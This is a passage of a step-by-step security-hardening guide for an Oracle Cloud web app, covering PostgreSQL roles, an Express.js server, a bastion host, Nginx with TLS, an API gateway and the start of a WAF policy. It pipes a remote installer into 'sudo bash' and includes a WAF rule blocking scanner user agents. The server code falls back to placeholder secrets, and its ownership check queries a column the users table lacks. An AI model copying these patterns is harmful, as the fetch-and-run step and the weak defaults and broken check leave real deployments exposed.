-- Grant migration user ownership for schema changes
ALTER DATABASE webapp_db OWNER TO migration_user;

-- Connect to webapp_db
\c webapp_db

-- Grant app_user minimal permissions
GRANT CONNECT ON DATABASE webapp_db TO app_user;
GRANT USAGE ON SCHEMA public TO app_user;

-- App user can only SELECT, INSERT, UPDATE, DELETE (no DROP, no CREATE)
ALTER DEFAULT PRIVILEGES FOR USER migration_user IN SCHEMA public 
  GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app_user;

-- App user can use sequences (for auto-increment IDs)
ALTER DEFAULT PRIVILEGES FOR USER migration_user IN SCHEMA public 
  GRANT USAGE, SELECT ON SEQUENCES TO app_user;

-- Create audit log table
CREATE TABLE audit_log (
  id SERIAL PRIMARY KEY,
  table_name VARCHAR(100),
  action VARCHAR(10),
  old_data JSONB,
  new_data JSONB,
  changed_by VARCHAR(100),
  changed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Enable logging
ALTER SYSTEM SET log_statement = 'mod';
ALTER SYSTEM SET log_connections = on;
ALTER SYSTEM SET log_disconnections = on;

SELECT pg_reload_conf();

\q
EOF

echo "PostgreSQL configured with least-privilege users"
```

### Step 2.3: Database Security Checklist

```bash
# Verify database security

# Check listening addresses
sudo -u postgres psql -c "SHOW listen_addresses;"

# Check user privileges
sudo -u postgres psql -c "\du"

# Check pg_hba.conf (connection rules)
sudo cat /etc/postgresql/*/main/pg_hba.conf | grep -v "^#" | grep -v "^$"

# Test connection from app subnet only works
# (This should fail from anywhere except 10.0.2.0/24)
```

---

## Phase 3: Layer 4 - Application Deployment

### Step 3.1: Create Application Server VM

```bash
source ~/oci-config.env

# Create Application Server VM
APP_INSTANCE_ID=$(oci compute instance launch \
  --compartment-id $COMPARTMENT_ID \
  --availability-domain $AD_NAME \
  --shape "VM.Standard.E4.Flex" \
  --shape-config '{"ocpus": 2, "memoryInGBs": 16}' \
  --subnet-id $PRIVATE_APP_SUBNET_ID \
  --nsg-ids "[\"$NSG_APP_ID\"]" \
  --image-id $UBUNTU_IMAGE_ID \
  --display-name "app-server-1" \
  --assign-public-ip false \
  --ssh-authorized-keys-file ~/.ssh/id_ed25519.pub \
  --query 'data.id' \
  --raw-output)

echo "APP_INSTANCE_ID=$APP_INSTANCE_ID" >> ~/oci-config.env
echo "Created App Instance: $APP_INSTANCE_ID"

# Get private IP
APP_PRIVATE_IP=$(oci compute instance list-vnics \
  --instance-id $APP_INSTANCE_ID \
  --query 'data[0]."private-ip"' \
  --raw-output)

echo "APP_PRIVATE_IP=$APP_PRIVATE_IP" >> ~/oci-config.env
echo "App Private IP: $APP_PRIVATE_IP"
```

### Step 3.2: Install Node.js and Dependencies (via Bastion)

```bash
# On App Server (via bastion)

# Install Node.js 20.x
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

# Verify
node --version
npm --version

# Install PM2 globally
sudo npm install -g pm2

# Create app directory
mkdir -p ~/webapp
cd ~/webapp

# Initialize project
npm init -y
```

### Step 3.3: Create Application Code

Create the following files on the app server:

**package.json**
```json
{
  "name": "secure-webapp",
  "version": "1.0.0",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "dev": "nodemon server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "helmet": "^7.1.0",
    "express-rate-limit": "^7.1.5",
    "express-validator": "^7.0.1",
    "jsonwebtoken": "^9.0.2",
    "pg": "^8.11.3",
    "uuid": "^9.0.1",
    "morgan": "^1.10.0",
    "bcryptjs": "^2.4.3",
    "cors": "^2.8.5"
  }
}
```

**server.js** (Full application code with all Layer 4 controls)
```javascript
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { body, param, validationResult } = require('express-validator');
const jwt = require('jsonwebtoken');
const { Pool } = require('pg');
const { v4: uuidv4 } = require('uuid');
const morgan = require('morgan');
const bcrypt = require('bcryptjs');

const app = express();

// ============================================
// CONFIGURATION (use environment variables in production)
// ============================================
const config = {
  port: process.env.PORT || 3000,
  jwtSecret: process.env.JWT_SECRET || 'CHANGE_THIS_IN_PRODUCTION',
  dbHost: process.env.DB_HOST || '10.0.3.x', // DB private IP
  dbUser: process.env.DB_USER || 'app_user',
  dbPassword: process.env.DB_PASSWORD || 'CHANGE_THIS',
  dbName: process.env.DB_NAME || 'webapp_db',
  trustedProxies: 1 // Number of proxies in front (LB)
};

// ============================================
// DATABASE CONNECTION (Layer 5 Integration)
// ============================================
const pool = new Pool({
  host: config.dbHost,
  port: 5432,
  database: config.dbName,
  user: config.dbUser,
  password: config.dbPassword,
  max: 20,                    // Connection pool size
  idleTimeoutMillis: 30000,   // Close idle connections
  connectionTimeoutMillis: 5000
});

// ============================================
// LAYER 4 CONTROLS: SECURITY MIDDLEWARE
// ============================================

// 1. Security Headers (helmet)
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
    }
  },
  hsts: { maxAge: 31536000, includeSubDomains: true }
}));

// 2. Trust Proxy (CRITICAL: only trust your LB)
app.set('trust proxy', config.trustedProxies);

// 3. Body Parsing with Size Limits
app.use(express.json({ 
  limit: '10kb',  // Prevent large payload attacks
  strict: true 
}));
app.use(express.urlencoded({ 
  extended: true, 
  limit: '10kb' 
}));

// 4. Request ID for Tracing
app.use((req, res, next) => {
  req.id = req.headers['x-request-id'] || uuidv4();
  res.setHeader('x-request-id', req.id);
  next();
});

// 5. Structured Logging (JSON format)
app.use(morgan((tokens, req, res) => {
  return JSON.stringify({
    timestamp: new Date().toISOString(),
    requestId: req.id,
    method: tokens.method(req, res),
    url: tokens.url(req, res),
    status: parseInt(tokens.status(req, res)),
    responseTime: parseFloat(tokens['response-time'](req, res)),
    userId: req.user?.id || 'anonymous',
    ip: req.ip,
    userAgent: req.headers['user-agent']
    // NEVER log: passwords, tokens, PII, request bodies
  });
}));

// 6. Rate Limiting (App-level backup to Gateway)
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                   // 100 requests per window
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, please try again later' },
  keyGenerator: (req) => req.ip
});

const authLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,  // 1 hour
  max: 5,                     // 5 attempts
  message: { error: 'Too many login attempts, try again in an hour' },
  skipSuccessfulRequests: true
});

app.use('/api/', generalLimiter);

// ============================================
// AUTHENTICATION MIDDLEWARE
// ============================================
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ 
      error: 'Authentication required',
      requestId: req.id 
    });
  }
  
  const token = authHeader.split(' ')[1];
  
  try {
    const decoded = jwt.verify(token, config.jwtSecret);
    req.user = decoded;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired', requestId: req.id });
    }
    return res.status(401).json({ error: 'Invalid token', requestId: req.id });
  }
}

// ============================================
// AUTHORIZATION MIDDLEWARE (Object-Level)
// ============================================
function authorizeResourceOwner(resourceTable) {
  return async (req, res, next) => {
    const resourceId = req.params.id;
    const userId = req.user.id;
    
    try {
      // PARAMETERIZED QUERY (SQL injection prevention)
      const result = await pool.query(
        `SELECT user_id FROM ${resourceTable} WHERE id = $1`,
        [resourceId]
      );
      
      if (!result.rows[0]) {
        return res.status(404).json({ 
          error: 'Resource not found',
          requestId: req.id 
        });
      }
      
      // Object-level authorization check
      if (result.rows[0].user_id !== userId && req.user.role !== 'admin') {
        // Log authorization failure for security monitoring
        console.log(JSON.stringify({
          type: 'AUTHZ_FAILURE',
          requestId: req.id,
          userId: userId,
          resourceId: resourceId,
          resourceTable: resourceTable,
          timestamp: new Date().toISOString()
        }));
        
        return res.status(403).json({ 
          error: 'Access denied',
          requestId: req.id 
        });
      }
      
      next();
    } catch (err) {
      console.error('Authorization error:', err);
      return res.status(500).json({ 
        error: 'Internal server error',
        requestId: req.id 
      });
    }
  };
}

// ============================================
// INPUT VALIDATION SCHEMAS
// ============================================
const validations = {
  register: [
    body('email')
      .isEmail()
      .normalizeEmail()
      .isLength({ max: 255 })
      .withMessage('Valid email required (max 255 chars)'),
    body('password')
      .isLength({ min: 8, max: 128 })
      .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/)
      .withMessage('Password: 8-128 chars, uppercase, lowercase, number, special char'),
    body('name')
      .trim()
      .isLength({ min: 1, max: 100 })
      .escape()
      .withMessage('Name required (1-100 chars)')
  ],
  
  login: [
    body('email').isEmail().normalizeEmail(),
    body('password').notEmpty().isLength({ max: 128 })
  ],
  
  resourceId: [
    param('id').isUUID().withMessage('Invalid resource ID')
  ],
  
  createOrder: [
    body('items')
      .isArray({ min: 1, max: 100 })
      .withMessage('Items required (1-100)'),
    body('items.*.productId')
      .isUUID()
      .withMessage('Valid product ID required'),
    body('items.*.quantity')
      .isInt({ min: 1, max: 1000 })
      .withMessage('Quantity must be 1-1000'),
    body('idempotencyKey')
      .isUUID()
      .withMessage('Idempotency key required (UUID)')
  ]
};

// Validation error handler
function validate(req, res, next) {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ 
      error: 'Validation failed',
      details: errors.array().map(e => ({ field: e.path, message: e.msg })),
      requestId: req.id
    });
  }
  next();
}

// ============================================
// ROUTES
// ============================================

// Health check (for Load Balancer)
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// Public: Register
app.post('/api/auth/register', 
  validations.register, 
  validate,
  async (req, res) => {
    const { email, password, name } = req.body;
    
    try {
      // Check if user exists
      const existing = await pool.query(
        'SELECT id FROM users WHERE email = $1',
        [email]
      );
      
      if (existing.rows[0]) {
        return res.status(409).json({ 
          error: 'Email already registered',
          requestId: req.id 
        });
      }
      
      // Hash password
      const hashedPassword = await bcrypt.hash(password, 12);
      
      // Create user
      const result = await pool.query(
        `INSERT INTO users (id, email, password_hash, name, created_at) 
         VALUES ($1, $2, $3, $4, NOW()) 
         RETURNING id, email, name`,
        [uuidv4(), email, hashedPassword, name]
      );
      
      res.status(201).json({
        user: result.rows[0],
        requestId: req.id
      });
    } catch (err) {
      console.error('Registration error:', err);
      res.status(500).json({ 
        error: 'Registration failed',
        requestId: req.id 
      });
    }
  }
);

// Public: Login (with rate limiting)
app.post('/api/auth/login',
  authLimiter,
  validations.login,
  validate,
  async (req, res) => {
    const { email, password } = req.body;
    
    try {
      const result = await pool.query(
        'SELECT id, email, password_hash, name, role FROM users WHERE email = $1',
        [email]
      );
      
      if (!result.rows[0]) {
        // Use same response for not found and wrong password (prevent enumeration)
        return res.status(401).json({ 
          error: 'Invalid credentials',
          requestId: req.id 
        });
      }
      
      const user = result.rows[0];
      const validPassword = await bcrypt.compare(password, user.password_hash);
      
      if (!validPassword) {
        return res.status(401).json({ 
          error: 'Invalid credentials',
          requestId: req.id 
        });
      }
      
      // Generate JWT
      const token = jwt.sign(
        { id: user.id, email: user.email, role: user.role || 'user' },
        config.jwtSecret,
        { expiresIn: '1h' }
      );
      
      res.json({
        token,
        user: { id: user.id, email: user.email, name: user.name },
        requestId: req.id
      });
    } catch (err) {
      console.error('Login error:', err);
      res.status(500).json({ 
        error: 'Login failed',
        requestId: req.id 
      });
    }
  }
);

// Protected: Get user profile
app.get('/api/users/:id',
  authenticate,
  validations.resourceId,
  validate,
  authorizeResourceOwner('users'),  // User can only access their own profile
  async (req, res) => {
    try {
      const result = await pool.query(
        'SELECT id, email, name, created_at FROM users WHERE id = $1',
        [req.params.id]
      );
      
      res.json({ user: result.rows[0], requestId: req.id });
    } catch (err) {
      console.error('Get user error:', err);
      res.status(500).json({ error: 'Failed to get user', requestId: req.id });
    }
  }
);

// Protected: Create order (with idempotency)
app.post('/api/orders',
  authenticate,
  validations.createOrder,
  validate,
  async (req, res) => {
    const { items, idempotencyKey } = req.body;
    const userId = req.user.id;
    
    try {
      // IDEMPOTENCY CHECK - prevent duplicate orders
      const existing = await pool.query(
        'SELECT id, status, created_at FROM orders WHERE idempotency_key = $1',
        [idempotencyKey]
      );
      
      if (existing.rows[0]) {
        // Return same response for duplicate request
        return res.json({
          order: existing.rows[0],
          duplicate: true,
          requestId: req.id
        });
      }
      
      // Create order (simplified - add your business logic)
      const orderId = uuidv4();
      const result = await pool.query(
        `INSERT INTO orders (id, user_id, items, idempotency_key, status, created_at) 
         VALUES ($1, $2, $3, $4, 'pending', NOW()) 
         RETURNING id, status, created_at`,
        [orderId, userId, JSON.stringify(items), idempotencyKey]
      );
      
      res.status(201).json({
        order: result.rows[0],
        requestId: req.id
      });
    } catch (err) {
      console.error('Create order error:', err);
      res.status(500).json({ 
        error: 'Failed to create order',
        requestId: req.id 
      });
    }
  }
);

// ============================================
// ERROR HANDLING
// ============================================
app.use((err, req, res, next) => {
  console.error(JSON.stringify({
    type: 'ERROR',
    requestId: req.id,
    error: err.message,
    stack: process.env.NODE_ENV === 'development' ? err.stack : undefined,
    timestamp: new Date().toISOString()
  }));
  
  res.status(500).json({
    error: 'Internal server error',
    requestId: req.id
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    error: 'Not found',
    requestId: req.id
  });
});

// ============================================
// START SERVER
// ============================================
app.listen(config.port, '0.0.0.0', () => {
  console.log(JSON.stringify({
    type: 'SERVER_START',
    port: config.port,
    timestamp: new Date().toISOString()
  }));
});

module.exports = app;
```

### Step 3.4: Create Database Schema

```sql
-- Run this via migration_user (has schema change privileges)
-- migrations/001_initial_schema.sql

CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- Users table
CREATE TABLE users (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  email VARCHAR(255) UNIQUE NOT NULL,
  password_hash VARCHAR(255) NOT NULL,
  name VARCHAR(100) NOT NULL,
  role VARCHAR(20) DEFAULT 'user',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Orders table
CREATE TABLE orders (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  user_id UUID NOT NULL REFERENCES users(id),
  items JSONB NOT NULL,
  idempotency_key UUID UNIQUE NOT NULL,
  status VARCHAR(20) DEFAULT 'pending',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Indexes
CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_orders_user_id ON orders(user_id);
CREATE INDEX idx_orders_idempotency_key ON orders(idempotency_key);

-- Trigger for updated_at
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
   NEW.updated_at = CURRENT_TIMESTAMP;
   RETURN NEW;
END;
$$ language 'plpgsql';

CREATE TRIGGER update_users_updated_at BEFORE UPDATE ON users
  FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

CREATE TRIGGER update_orders_updated_at BEFORE UPDATE ON orders
  FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
```

### Step 3.5: Deploy and Run Application

```bash
# On App Server (via bastion)
cd ~/webapp

# Install dependencies
npm install

# Create environment file
cat > .env << EOF
PORT=3000
JWT_SECRET=$(openssl rand -base64 32)
DB_HOST=10.0.3.x  # Replace with actual DB private IP
DB_USER=app_user
DB_PASSWORD=CHANGE_THIS_STRONG_PASSWORD_1
DB_NAME=webapp_db
NODE_ENV=production
EOF

# Start with PM2
pm2 start server.js --name webapp --env production

# Save PM2 config (auto-restart on reboot)
pm2 save
pm2 startup

# Check status
pm2 status
pm2 logs webapp
```

---

## Phase 4: SSH/Bastion Access

### Option A: OCI Bastion Service (Recommended)

```bash
source ~/oci-config.env

# Create Bastion
BASTION_ID=$(oci bastion bastion create \
  --compartment-id $COMPARTMENT_ID \
  --bastion-type STANDARD \
  --target-subnet-id $PRIVATE_APP_SUBNET_ID \
  --client-cidr-block-allow-list '["YOUR_PUBLIC_IP/32"]' \
  --display-name "webapp-bastion" \
  --query 'data.id' \
  --raw-output)

echo "BASTION_ID=$BASTION_ID" >> ~/oci-config.env
echo "Created Bastion: $BASTION_ID"

# Wait for bastion to be active
oci bastion bastion get --bastion-id $BASTION_ID --query 'data."lifecycle-state"'
```

**Create SSH Session to App Server:**
```bash
# Create managed SSH session
SESSION_ID=$(oci bastion session create-managed-ssh \
  --bastion-id $BASTION_ID \
  --target-resource-id $APP_INSTANCE_ID \
  --target-os-username ubuntu \
  --key-type PUB \
  --ssh-public-key-file ~/.ssh/id_ed25519.pub \
  --display-name "app-access" \
  --session-ttl-in-seconds 3600 \
  --query 'data.id' \
  --raw-output)

# Get SSH command
oci bastion session get --session-id $SESSION_ID --query 'data."ssh-metadata"'
```

### Option B: Self-Managed Bastion VM

```bash
source ~/oci-config.env

# Create Bastion VM in public subnet
BASTION_INSTANCE_ID=$(oci compute instance launch \
  --compartment-id $COMPARTMENT_ID \
  --availability-domain $AD_NAME \
  --shape "VM.Standard.E4.Flex" \
  --shape-config '{"ocpus": 1, "memoryInGBs": 2}' \
  --subnet-id $PUBLIC_SUBNET_ID \
  --nsg-ids "[\"$NSG_BASTION_ID\"]" \
  --image-id $UBUNTU_IMAGE_ID \
  --display-name "bastion" \
  --assign-public-ip true \
  --ssh-authorized-keys-file ~/.ssh/id_ed25519.pub \
  --query 'data.id' \
  --raw-output)

# Get public IP
BASTION_PUBLIC_IP=$(oci compute instance list-vnics \
  --instance-id $BASTION_INSTANCE_ID \
  --query 'data[0]."public-ip"' \
  --raw-output)

echo "BASTION_PUBLIC_IP=$BASTION_PUBLIC_IP" >> ~/oci-config.env
echo "Bastion Public IP: $BASTION_PUBLIC_IP"
```

**Harden Bastion:**
```bash
# SSH to bastion
ssh -i ~/.ssh/id_ed25519 ubuntu@$BASTION_PUBLIC_IP

# On bastion - harden SSH
sudo tee /etc/ssh/sshd_config.d/hardening.conf << EOF
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
KbdInteractiveAuthentication no
ChallengeResponseAuthentication no
MaxAuthTries 3
LoginGraceTime 20
X11Forwarding no
AllowTcpForwarding yes
AllowAgentForwarding yes
ClientAliveInterval 300
ClientAliveCountMax 2
EOF

sudo systemctl restart ssh

# Install fail2ban
sudo apt update
sudo apt install -y fail2ban

sudo tee /etc/fail2ban/jail.d/sshd.local << EOF
[sshd]
enabled = true
maxretry = 5
findtime = 10m
bantime = 1h
EOF

sudo systemctl restart fail2ban
sudo systemctl enable fail2ban
```

**Configure SSH ProxyJump (on your laptop):**
```bash
# ~/.ssh/config
cat >> ~/.ssh/config << EOF

Host bastion-oci
  HostName $BASTION_PUBLIC_IP
  User ubuntu
  IdentityFile ~/.ssh/id_ed25519

Host app-server
  HostName $APP_PRIVATE_IP
  User ubuntu
  IdentityFile ~/.ssh/id_ed25519
  ProxyJump bastion-oci

Host db-server
  HostName $DB_PRIVATE_IP
  User ubuntu
  IdentityFile ~/.ssh/id_ed25519
  ProxyJump bastion-oci
EOF

# Now you can simply:
ssh app-server
ssh db-server
```

---

## Phase 5: Layer 2 - Load Balancer + TLS (Let's Encrypt)

### Step 5.1: Create Nginx Load Balancer VM

```bash
source ~/oci-config.env

# Create Nginx LB VM in public subnet
LB_INSTANCE_ID=$(oci compute instance launch \
  --compartment-id $COMPARTMENT_ID \
  --availability-domain $AD_NAME \
  --shape "VM.Standard.E4.Flex" \
  --shape-config '{"ocpus": 1, "memoryInGBs": 4}' \
  --subnet-id $PUBLIC_SUBNET_ID \
  --nsg-ids "[\"$NSG_LB_ID\"]" \
  --image-id $UBUNTU_IMAGE_ID \
  --display-name "nginx-lb" \
  --assign-public-ip true \
  --ssh-authorized-keys-file ~/.ssh/id_ed25519.pub \
  --query 'data.id' \
  --raw-output)

# Get public IP
LB_PUBLIC_IP=$(oci compute instance list-vnics \
  --instance-id $LB_INSTANCE_ID \
  --query 'data[0]."public-ip"' \
  --raw-output)

echo "LB_PUBLIC_IP=$LB_PUBLIC_IP" >> ~/oci-config.env
echo "Load Balancer Public IP: $LB_PUBLIC_IP"
```

### Step 5.2: Configure DNS

Point your domain to the load balancer:
```
api.yourdomain.com  →  A  →  $LB_PUBLIC_IP
```

### Step 5.3: Install and Configure Nginx + Let's Encrypt

```bash
# SSH to LB (can be direct since it's in public subnet with SSH allowed from your IP)
ssh -i ~/.ssh/id_ed25519 ubuntu@$LB_PUBLIC_IP

# Install Nginx and Certbot
sudo apt update
sudo apt install -y nginx certbot python3-certbot-nginx

# Stop nginx temporarily for cert issuance
sudo systemctl stop nginx

# Get Let's Encrypt certificate
sudo certbot certonly --standalone \
  -d api.yourdomain.com \
  --non-interactive \
  --agree-tos \
  -m your-email@example.com

# Create Nginx configuration
sudo tee /etc/nginx/sites-available/webapp << 'EOF'
# Rate limiting zones
limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=auth:10m rate=1r/s;
limit_req_zone $binary_remote_addr zone=api:10m rate=30r/s;

# Upstream backend (app server)
upstream app_backend {
    server 10.0.2.x:3000;  # Replace with actual app private IP
    keepalive 32;
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name api.yourdomain.com;
    return 301 https://$server_name$request_uri;
}

# HTTPS server
server {
    listen 443 ssl http2;
    server_name api.yourdomain.com;

    # SSL Configuration
    ssl_certificate /etc/letsencrypt/live/api.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/api.yourdomain.com/privkey.pem;
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:50m;
    ssl_session_tickets off;
    
    # Modern SSL configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=63072000" always;

    # ============================================
    # LAYER 2 CONTROLS
    # ============================================
    
    # Body size limit (match app limit)
    client_max_body_size 10m;
    
    # Timeouts (prevent slowloris)
    client_body_timeout 10s;
    client_header_timeout 10s;
    keepalive_timeout 15s;
    send_timeout 10s;
    
    # Buffer limits
    client_body_buffer_size 16k;
    client_header_buffer_size 1k;
    large_client_header_buffers 4 8k;

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # Health check endpoint (no rate limit)
    location /health {
        proxy_pass http://app_backend;
        proxy_http_version 1.1;
        proxy_set_header Connection "";
    }

    # Auth endpoints (strict rate limit)
    location /api/auth/ {
        limit_req zone=auth burst=5 nodelay;
        limit_req_status 429;
        
        proxy_pass http://app_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Request-ID $request_id;
        proxy_set_header Connection "";
        
        proxy_connect_timeout 10s;
        proxy_send_timeout 30s;
        proxy_read_timeout 30s;
    }

    # API endpoints (moderate rate limit)
    location /api/ {
        limit_req zone=api burst=50 nodelay;
        limit_req_status 429;
        
        proxy_pass http://app_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Request-ID $request_id;
        proxy_set_header Connection "";
        
        proxy_connect_timeout 10s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }

    # Default location
    location / {
        limit_req zone=general burst=20 nodelay;
        
        proxy_pass http://app_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Request-ID $request_id;
        proxy_set_header Connection "";
    }

    # Deny access to hidden files
    location ~ /\. {
        deny all;
    }
}
EOF

# Update upstream with actual app IP
sudo sed -i "s/10.0.2.x/$APP_PRIVATE_IP/" /etc/nginx/sites-available/webapp

# Enable site
sudo ln -sf /etc/nginx/sites-available/webapp /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default

# Test and reload
sudo nginx -t
sudo systemctl start nginx
sudo systemctl enable nginx

# Setup auto-renewal
sudo systemctl enable certbot.timer
sudo systemctl start certbot.timer

# Test renewal
sudo certbot renew --dry-run
```

### Step 5.4: Configure Auto-Renewal with Nginx Reload

```bash
# Create post-renewal hook
sudo tee /etc/letsencrypt/renewal-hooks/post/reload-nginx.sh << 'EOF'
#!/bin/bash
systemctl reload nginx
EOF

sudo chmod +x /etc/letsencrypt/renewal-hooks/post/reload-nginx.sh
```

---

## Phase 6: Layer 3 - API Gateway

### Option A: OCI API Gateway (Production)

```bash
source ~/oci-config.env

# Create API Gateway
APIGW_ID=$(oci apigateway gateway create \
  --compartment-id $COMPARTMENT_ID \
  --display-name "webapp-gateway" \
  --endpoint-type PUBLIC \
  --subnet-id $PUBLIC_SUBNET_ID \
  --query 'data.id' \
  --raw-output)

echo "APIGW_ID=$APIGW_ID" >> ~/oci-config.env

# Wait for gateway to be active
oci apigateway gateway get --gateway-id $APIGW_ID --query 'data."lifecycle-state"'
```

**Create API Deployment:**
```bash
# Create deployment spec
cat > /tmp/api-deployment.json << EOF
{
  "displayName": "webapp-api",
  "gatewayId": "$APIGW_ID",
  "compartmentId": "$COMPARTMENT_ID",
  "pathPrefix": "/v1",
  "specification": {
    "requestPolicies": {
      "rateLimiting": {
        "rateInRequestsPerSecond": 10,
        "rateKey": "CLIENT_IP"
      }
    },
    "loggingPolicies": {
      "accessLog": {
        "isEnabled": true
      },
      "executionLog": {
        "isEnabled": true,
        "logLevel": "INFO"
      }
    },
    "routes": [
      {
        "path": "/health",
        "methods": ["GET"],
        "backend": {
          "type": "HTTP_BACKEND",
          "url": "http://$APP_PRIVATE_IP:3000/health"
        }
      },
      {
        "path": "/auth/{path*}",
        "methods": ["POST"],
        "backend": {
          "type": "HTTP_BACKEND",
          "url": "http://$APP_PRIVATE_IP:3000/api/auth"
        },
        "requestPolicies": {
          "rateLimiting": {
            "rateInRequestsPerSecond": 1,
            "rateKey": "CLIENT_IP"
          }
        }
      },
      {
        "path": "/{path*}",
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "backend": {
          "type": "HTTP_BACKEND",
          "url": "http://$APP_PRIVATE_IP:3000/api"
        },
        "requestPolicies": {
          "authentication": {
            "type": "JWT_AUTHENTICATION",
            "tokenHeader": "Authorization",
            "tokenAuthScheme": "Bearer",
            "isAnonymousAccessAllowed": false,
            "issuers": ["https://your-auth-provider.com"],
            "audiences": ["your-app"],
            "publicKeys": {
              "type": "STATIC_KEYS",
              "keys": [
                {
                  "format": "JSON_WEB_KEY",
                  "kty": "RSA",
                  "use": "sig",
                  "kid": "key-1"
                }
              ]
            }
          }
        }
      }
    ]
  }
}
EOF

oci apigateway deployment create --from-json file:///tmp/api-deployment.json
```

### Option B: Application-Level Gateway (Simpler)

If you're using Nginx as LB, it already handles basic gateway functions. Add these controls to your Nginx config:

```nginx
# In the /api/ location block, add:

# Request logging with correlation
log_format api_json escape=json '{'
  '"time": "$time_iso8601",'
  '"request_id": "$request_id",'
  '"remote_addr": "$remote_addr",'
  '"method": "$request_method",'
  '"uri": "$uri",'
  '"status": "$status",'
  '"body_bytes_sent": "$body_bytes_sent",'
  '"request_time": "$request_time",'
  '"upstream_response_time": "$upstream_response_time"'
'}';

access_log /var/log/nginx/api_access.log api_json;
```

---

## Phase 7: Layer 1 - WAF/Edge Protection

### Step 7.1: Create WAF Policy

```bash
source ~/oci-config.env

# Create WAF Policy
WAF_POLICY_ID=$(oci waf web-app-firewall-policy create \
  --compartment-id $COMPARTMENT_ID \
  --display-name "webapp-waf-policy" \
  --actions '[
    {
      "name": "blockAction",
      "type": "RETURN_HTTP_RESPONSE",
      "code": 403,
      "body": {
        "type": "STATIC_TEXT",
        "text": "{\"error\": \"Request blocked by WAF\"}"
      },
      "headers": [
        {"name": "Content-Type", "value": "application/json"}
      ]
    },
    {
      "name": "allowAction",
      "type": "ALLOW"
    }
  ]' \
  --request-access-control '{
    "defaultActionName": "allowAction",
    "rules": [
      {
        "name": "block-bad-user-agents",
        "type": "ACCESS_CONTROL",
        "actionName": "blockAction",
        "condition": "i_contains(http.request.headers[\"user-agent\"][0], \"sqlmap\") or i_contains(http.request.headers[\"user-agent\"][0], \"nikto\") or i_contains(http.request.headers[\"user-agent\"][0], \"nmap\")",
        "conditionLanguage": "JMESPATH"
      },
      {
        "name": "block-no-user-agent",
        "type": "ACCESS_CONTROL",
        "actionName": "blockAction",
        "condition": "http.request.headers[\"user-agent\"] == null",
        "conditionLanguage": "JMESPATH"
      }
    ]
  }' \
  --request-rate-limiting '{
    "rules": [
      {
        "name": "rate-limit-login",
        "type": "REQUEST_RATE_LIMITING",
        "actionName": "blockAction",
        "condition": "http.request.url.path == \"/api/auth/login\"",
        "conditionLanguage": "JMESPATH",
        "configurations": [
          {
            "periodInSeconds": 60,
            "requestsLimit": 5,
            "actionDurationInSeconds": 600
          }
        ]
      },
      {
        "name": "rate-limit-register",
        "type": "REQUEST_RATE_LIMITING",
